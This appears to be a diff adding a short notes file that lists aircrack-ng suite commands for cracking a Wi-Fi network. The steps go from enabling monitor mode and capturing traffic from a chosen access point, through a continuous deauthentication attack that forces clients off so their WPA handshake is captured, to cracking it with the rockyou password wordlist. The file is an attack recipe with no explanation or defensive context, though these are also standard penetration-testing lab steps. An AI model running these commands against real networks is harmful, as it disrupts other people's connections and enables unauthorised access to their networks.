@@ -1,0 +1,14 @@
+Commands used:
+================
+iwconfig
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airmon-ng 
+sudo airodump-ng wlan0
+
+airodump-ng -w dump-hack -c CHANNEL_NO --bssid MAC_ADDR wlan0
+sudo aireplay-ng --deauth 0 -a MACADDR wlan0
+wireshark dump-hack-01.cap
+----eapol
+airmon-ng stop wlan0
+aircrack-ng dump-hack-01.cap -w /usr/share/wordlists/rockyou.txt
